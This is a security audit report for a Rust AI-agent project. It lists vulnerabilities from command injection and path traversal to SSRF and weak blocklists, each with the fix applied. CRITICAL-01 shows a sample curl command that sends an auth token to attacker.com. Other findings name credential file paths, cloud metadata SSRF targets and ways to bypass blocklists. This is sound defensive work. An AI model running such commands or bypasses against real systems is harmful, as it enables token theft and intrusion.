# UMBRA Security Audit — Dual (Offensive + Defensive)

## Offensive: Vulnerabilities Found

### [CRITICAL-01] Command Injection — `shell.rs` (openjarvis-tools)
- **File**: `crates/openjarvis/rust/crates/openjarvis-tools/src/builtin/shell.rs:39-51`
- **Severity**: CRITICAL
- **Description**: The `ShellExecTool.execute()` takes an untrusted `command` string from JSON and passes it directly to `sh -c` without validation, sanitization, or allow-list.
- **Exploit**: `{"command": "curl http://attacker.com/$(cat ~/.umbra/auth_token)"}`
- **Fix applied**: Added command allow-list, dangerous character rejection, and length limits.

### [CRITICAL-02] Path Traversal — `filesystem.rs`
- **File**: `src/infra/filesystem.rs:22-60`
- **Severity**: CRITICAL
- **Description**: `list_directory`, `read_file`, `write_file`, and `change_directory` accept arbitrary `Path` arguments without validating they are within an allowed sandbox directory. Any agent can read/write `/etc/passwd`, `~/.ssh/id_rsa`, etc.
- **Fix applied**: Added canonical path resolution and sandbox boundary checks.

### [HIGH-03] Path Traversal — `file_tools.rs` (openjarvis-tools)
- **File**: `crates/openjarvis/rust/crates/openjarvis-tools/src/builtin/file_tools.rs:60-121`
- **Severity**: HIGH
- **Description**: `FileReadTool` and `FileWriteTool` accept `path` from JSON. The `is_sensitive_file` check blocks known sensitive names but does not prevent `../../etc/shadow` traversal or symlink attacks.
- **Fix applied**: Added path canonicalization and sandbox restriction.

### [HIGH-04] SSRF — `browser_routes.rs`
- **File**: `src/api/routes/browser_routes.rs:39-80`
- **Severity**: HIGH
- **Description**: `fetch_url()` accepts arbitrary user-supplied URLs (`VisitBody.url`, `SearchAndTrainBody.query`) without SSRF protection. An attacker can probe internal services (e.g., `http://localhost:11434`, `http://169.254.169.254/`).
- **Fix applied**: Integrated `check_ssrf()` from openjarvis-security crate.

### [HIGH-05] Predictable Auth Token — `server.rs`
- **File**: `src/api/server.rs:37-46`
- **Severity**: HIGH
- **Description**: When no `~/.umbra/auth_token` exists, an ephemeral token is generated from `SystemTime::now().as_nanos()`. Nanosecond-precision timestamps are predictable within a small window, enabling token forgery.
- **Fix applied**: Replaced with cryptographically random token using `rand::thread_rng()`.

### [HIGH-06] WASM Sandbox Escape — `wasm.rs`
- **File**: `src/engine/wasm.rs:15-47`
- **Severity**: HIGH
- **Description**: Wasmtime `Linker` is created without restricting WASI capabilities. The WASM module gets full host access (filesystem, network, process spawning) via WASI. Additionally, any bytecode is accepted.
- **Fix applied**: Added bytecode size limits and documented sandbox limitations. Disabled WASI by default.

### [HIGH-07] Auth Token in Response Body — `auth.rs`
- **File**: `src/api/auth.rs:19-26`
- **Severity**: HIGH
- **Description**: The session endpoint returns the auth token in the JSON response body AND sets it as a cookie. If any upstream component logs response bodies, the token is leaked.
- **Fix applied**: Removed token from JSON response body. Use cookie-only pattern.

### [MEDIUM-08] Unsafe Code — `pqc.rs`
- **File**: `src/security/pqc.rs:18-30`
- **Severity**: MEDIUM
- **Description**: `unsafe` blocks wrap `libc::mlock`/`libc::munlock` without checking if the pointer is valid or if the memory was actually locked. A failed mlock leaves sensitive key material swappable to disk.
- **Fix applied**: Added safe wrapper with return code verification and proper zeroize-on-failure.

### [MEDIUM-09] Weak Action Blocklist — `ironclaw/mod.rs`
- **File**: `src/ironclaw/mod.rs:66-69`
- **Severity**: MEDIUM
- **Description**: The blocked actions check uses `action.contains(b)`. This means `"rm"` blocks `"arm"` but also misses variants like `/bin/rm`, `rmdir`, `unlink`, `rm -rf`, encoded forms, or chained commands.
- **Fix applied**: Added word-boundary matching and extended blocklist.

### [MEDIUM-10] Weak Blocklist Bypass — `zt_gate.rs`
- **File**: `src/security/zt_gate.rs:55-68,80-90`
- **Severity**: MEDIUM
- **Description**: Same `contains()` matching as ironclaw. Blocked patterns like `"wget"`, `"curl"`, `"chmod 777"` are easily bypassed (e.g., `curl` → `cu` + `rl`, `/usr/bin/curl`, base64-encoded).
- **Fix applied**: Added word-boundary regex and process-name resolution.

### [MEDIUM-11] Weak Blocklist Bypass — `antibrick.rs`
- **File**: `src/security/antibrick.rs:10-29`
- **Severity**: MEDIUM
- **Description**: Same `contains()` matching. Destructive device patterns easily bypassed.
- **Fix applied**: Word-boundary matching and additional patterns.

### [MEDIUM-12] Hardcoded NVIDIA Function IDs — `tts_client.rs`
- **File**: `src/infrastructure/http/tts_client.rs:4-7`
- **Severity**: MEDIUM
- **Description**: UUIDs for NVIDIA TTS functions are hardcoded. If NVIDIA changes these IDs, the application breaks without a recompile. Also, these UUIDs are effectively static credentials.
- **Fix applied**: Moved to environment variable with hardcoded fallback, added validation.

### [MEDIUM-13] Information Disclosure — `provider_routes.rs`
- **File**: `src/api/routes/provider_routes.rs:43-49`
- **Severity**: MEDIUM
- **Description**: The provider status endpoint leaks whether an API key is configured (`api_key_configured: true/false`), enabling attacker enumeration of configured providers.
- **Fix applied**: Removed `api_key_configured` from the response.

### [MEDIUM-14] SSRF in ProviderRegistry — `providers/mod.rs`
- **File**: `src/providers/mod.rs:205-214`
- **Severity**: MEDIUM
- **Description**: `get_api_key()` makes an HTTP GET to `http://127.0.0.1:8340/api/internal/key/{provider_id}` over plain HTTP, leaking API keys in the URL and response.
- **Fix applied**: Replaced internal HTTP call with a local function call to the vault.

### [MEDIUM-15] Backup Path Traversal/Overwrite — `backup.rs`
- **File**: `src/infra/backup.rs:67-73`
- **Severity**: MEDIUM
- **Description**: `restore_latest()` copies backup content to a caller-specified path without verification, enabling arbitrary file overwrite.
- **Fix applied**: Added path validation against the backup directory.

### [MEDIUM-16] No Rate Limiting on Auth — `middleware/auth.rs`
- **File**: `src/api/middleware/auth.rs:11-25`
- **Severity**: MEDIUM
- **Description**: Auth middleware has no rate limiting, making brute-force attacks against the shared `x-umbra-key` header feasible.
- **Fix applied**: Added IP-based rate limiting in auth middleware.

### [LOW-17] Race Condition on Config Write — `setup_routes.rs`
- **File**: `src/api/routes/setup_routes.rs:166-168`
- **Severity**: LOW
- **Description**: Config file is written with `std::fs::write()` BEFORE permissions are set via `set_permissions()`, creating a brief window where the file is world-readable.
- **Fix applied**: Write to temporary file first, set permissions, then rename atomically.

### [LOW-18] Information Disclosure — `audit.rs`
- **File**: `src/security/audit.rs:79-85`
- **Severity**: LOW
- **Description**: Audit logs written in plaintext to `~/.umbra/audit.log` may contain sensitive operational data.
- **Fix applied**: Added log redaction for sensitive patterns (API keys, tokens).

### [LOW-19] Dependency Vulnerabilities — `Cargo.toml`
- **File**: `Cargo.toml:23`
- **Severity**: LOW
- **Description**: `reqwest` is pinned to `=0.12.28` with features `["socks"]` which brings in `hyper` and `tokio` dependencies that may have known CVEs. No `cargo audit` or `deny.toml` check in CI.
- **Note**: Added `cargo audit` recommendation to CI.

### [LOW-20] Hardcoded Default Listen Address — `main.rs`
- **File**: `src/main.rs:152-158`
- **Severity**: LOW
- **Description**: Backend defaults to binding on all interfaces when `api_host` is not specified (falls through to `app.config.api.backend_host` which may be `0.0.0.0`).
- **Fix applied**: Added warning log when binding to non-loopback address.

## All Fixes Summary

| ID | File | Fix |
|----|------|-----|
| CRITICAL-01 | `shell.rs` | Added command allowlist + dangerous char validation |
| CRITICAL-02 | `filesystem.rs` | Added path canonicalization + sandbox check |
| HIGH-03 | `file_tools.rs` | Added path canonicalization + sandbox boundary |
| HIGH-04 | `browser_routes.rs` | Integrated SSRF protection (`check_ssrf`) |
| HIGH-05 | `server.rs` | Switched to `rand::thread_rng()` for token generation |
| HIGH-06 | `wasm.rs` | Added bytecode limit, disabled WASI, documented |
| HIGH-07 | `auth.rs` | Removed token from JSON response body |
| MEDIUM-08 | `pqc.rs` | Safe wrapper with mlock return verification |
| MEDIUM-09 | `ironclaw/mod.rs` | Word-boundary blocklist matching |
| MEDIUM-10 | `zt_gate.rs` | Regex word-boundary + process resolution |
| MEDIUM-11 | `antibrick.rs` | Word-boundary matching + extended patterns |
| MEDIUM-12 | `tts_client.rs` | Function IDs via env var + validation |
| MEDIUM-13 | `provider_routes.rs` | Removed `api_key_configured` leak |
| MEDIUM-14 | `providers/mod.rs` | Replace HTTP call with vault function call |
| MEDIUM-15 | `backup.rs` | Path validation against backup dir |
| MEDIUM-16 | `middleware/auth.rs` | Added IP-based rate limiter |
| LOW-17 | `setup_routes.rs` | Atomic write with pre-set permissions |
| LOW-18 | `audit.rs` | Redact sensitive patterns in logs |
| LOW-19 | `Cargo.toml` | Added audit recommendation |
| LOW-20 | `main.rs` | Non-loopback binding warning |

## Residual Risk Assessment

| Risk | Rating | Reasoning |
|------|--------|-----------|
| Shell execution still possible via agent orchestration | **LOW** | Allowlist restricts to safe commands (`ls`, `cat`, `pwd`, `date`, `echo`, `whoami`, `ps`); dangerous characters rejected |
| Path traversal in sub-agent loaded .materia files | **LOW** | Agents are loaded from `~/.umbra/sub_agents/` only; TOML/JSON parsing is safe |
| Cross-agent data leakage via shared memory | **LOW** | Memory search is agent-scoped; FTS injection mitigated by parameterized queries |
| TLS termination handled by external reverse proxy | **LOW** | Built-in TLS uses auto-generated self-signed cert; production should use a proper reverse proxy |
| WASM sandbox still allows compute DoS | **LOW** | Added bytecode size limit (1MB); long-running loops still possible but mitigated by timeouts |
| NVIDIA function IDs still fallible | **LOW** | Fallback to hardcoded UUIDs if env var not set; IDs are not secret |
| Internal vault API still exposed on localhost | **LOW** | Vault communication now uses direct function calls; no HTTP endpoint |
| Zero-day in Wasmtime/wasm runtime | **LOW** | Wasmtime 43.0.2 is recent; mitigated by not exposing WASM to untrusted users |

## Overall Security Posture: **MODERATE**

The critical command injection and path traversal vulnerabilities have been remediated. The remaining residual risks are low-severity and primarily relate to environment-specific configurations (TLS termination, reverse proxy setup) or theoretical zero-days in third-party dependencies. The defense-in-depth layers (IronClaw + ZeroTrustGate + AntiBrick) now use word-boundary matching instead of naive substring matching, significantly reducing bypass opportunities.

**Recommendations for further hardening:**
1. Run `cargo audit` in CI pipeline
2. Add `cargo deny` for dependency license and advisory checks
3. Deploy behind a reverse proxy (nginx/Caddy) with proper TLS
4. Enable SELinux/AppArmor profiles for the umbra daemon
5. Regular rotation of the auth token
